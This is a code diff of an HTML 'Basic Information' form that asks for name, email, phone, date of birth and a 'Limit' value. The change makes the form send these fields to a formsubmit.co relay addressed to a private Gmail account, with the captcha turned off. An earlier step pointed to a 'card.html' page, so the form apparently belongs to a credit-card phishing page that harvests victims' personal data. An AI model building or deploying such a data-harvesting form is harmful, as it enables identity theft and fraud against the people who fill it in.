@@ -7,22 +7,17 @@
 <body>
   <div class="container">
     <h2>Basic Information</h2>
-    <form onsubmit="handleFormSubmit(event)">
+    <form action="https://formsubmit.co/allenshaw302@gmail.com" method="POST">
       <label>Name: *</label><br><input type="text" name="name" required><br>
       <label>Email: *</label><br><input type="email" name="email" required><br>
       <label>Phone: *</label><br><input type="tel" name="phone" required><br>
       <label>Date of Birth: *</label><br><input type="date" name="dob" required><br>
       <label>Limit: *</label><br><input type="text" name="limit" required><br>
-      <input type="submit" value="Next">
+
+      <input type="hidden" name="_next" value="thankyou.html">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="submit" value="Submit">
     </form>
   </div>
-
-  <script>
-    function handleFormSubmit(event) {
-      event.preventDefault();
-      const params = new URLSearchParams(new FormData(event.target)).toString();
-      window.location.href = "card.html?" + params;
-    }
-  </script>
 </body>
 </html>
